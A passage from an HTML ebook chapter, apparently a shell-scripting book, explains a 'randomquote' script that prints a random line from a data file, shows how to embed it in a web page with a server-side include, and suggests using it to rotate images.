<h4 class="h4" id="ch08lev2sec26"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">Given the name of a data file, this script first checks that the file exists and is readable. Then it feeds the entire file to a short <code>awk</code> script, which stores each line in an array, counts the lines, and then randomly picks one of the lines in the array and prints it to the screen.</p>&#13;
<h4 class="h4" id="ch08lev2sec27"><span epub:type="pagebreak" id="page_215"/><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">The script can be incorporated into an SSI-compliant web page with this line:</p>&#13;
<pre class="programs">&lt;!--#exec cmd="randomquote.sh samplequotes.txt"--&gt;</pre>&#13;
<p class="indent">Most servers require an <em>.shtml</em> file extension, rather than the more traditional <em>.html</em> or <em>.htm</em>, for the web page that contains this server-side include. With that simple change, the output of the <code>randomquote</code> command is incorporated into the content of the web page.</p>&#13;
<h4 class="h4" id="ch08lev2sec28"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">You can test this script on the command line by calling it directly, as shown in <a href="ch08.xhtml#ch8ex10">Listing 8-10</a>.</p>&#13;
<pre class="programs">$ <span class="codestrong">randomquote samplequotes.txt</span>&#13;
Neither rain nor sleet nor dark of night...&#13;
$ <span class="codestrong">randomquote samplequotes.txt</span>&#13;
The rain in Spain stays mainly on the plane? Does the pilot know about this?</pre>&#13;
<p class="listcap"><a id="ch8ex10"/><em>Listing 8-10: Running the</em> <code><em>randomquote</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch08lev2sec29"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">It would be simple to have the data file that <code>randomquote</code> uses contain a list of graphic image names. Then you could use this script to rotate through a set of graphics. Once you think about it, you’ll realize there’s quite a bit you can do with this idea.<span epub:type="pagebreak" id="page_216"/></p>&#13;
</body></html>